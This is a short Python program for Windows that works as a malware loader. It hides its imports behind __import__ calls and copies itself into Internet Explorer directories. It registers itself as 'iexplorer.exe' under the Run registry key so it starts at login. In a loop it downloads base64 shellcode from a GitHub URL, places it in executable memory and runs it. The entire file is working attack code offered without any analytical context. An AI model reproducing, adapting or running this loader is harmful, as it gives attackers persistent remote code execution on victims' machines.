urllib_module = __import__("urllib.request")
request = urllib_module.request

b64 = __import__("base64")
import ctypes as ct
wreg = __import__("winreg")
s = __import__("sys")
it = __import__("time")
ra = __import__("random")
sh = __import__("shutil")

kernel32 = getattr(ct.windll, "kernel32")

def move():
    try:
        target_directory = "C:\\Program Files\\Internet Explorer\\"
        code_path = s.argv[0]
        sh.move(code_path, target_directory)
    except Exception as e:
        print(f"Error: {e}")

    else:
        user = s.getenv("USERNAME")
        appdata_dir = "C:\\Users\\" + user + "\\AppData\\Local\\Microsoft\\Internet Explorer\\"

        try:
            sh.move(code_path, appdata_dir)
        except Exception as e:
            print(f"Error moving to AppData: {e}")

def bootup():
    exe_path = s.argv[0]
    reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "iexplorer.exe"

    try:
        with wreg.OpenKey(wreg.HKEY_CURRENT_USER, reg_key, 0, wreg.KEY_SET_VALUE) as key:
            wreg.SetValueEx(key, value_name, 0, wreg.REG_SZ, exe_path)
        print(f"Persistence set: {exe_path} will run at login.")
    except Exception as e:
        print(f"Error setting registry key: {e}")

def get_code(url):
    with request.urlopen(url) as response:
        shellcode = b64.decodebytes(response.read())

    return shellcode

def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ct.c_void_p
    kernel32.RtlMoveMemory.argtypes = (
        ct.c_void_p,
        ct.c_void_p,
        ct.c_size_t)

    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr

def run(shellcode):
    buf = ct.create_string_buffer(shellcode)

    ptr = write_memory(buf)

    shell_func = ct.cast(ptr, ct.CFUNCTYPE(None))
    shell_func()

if __name__ == '__main__':
    move()
    bootup()
    while True:
        try:
            url = "https://raw.githubusercontent.com/King4erik/Payload-Connection/main/shellcode.bin"
            shellcode = get_code(url)
            run(shellcode)
        except Exception as e:
            print(f"Error: {e}")
        it.sleep(ra.randint(1, 5 * 60))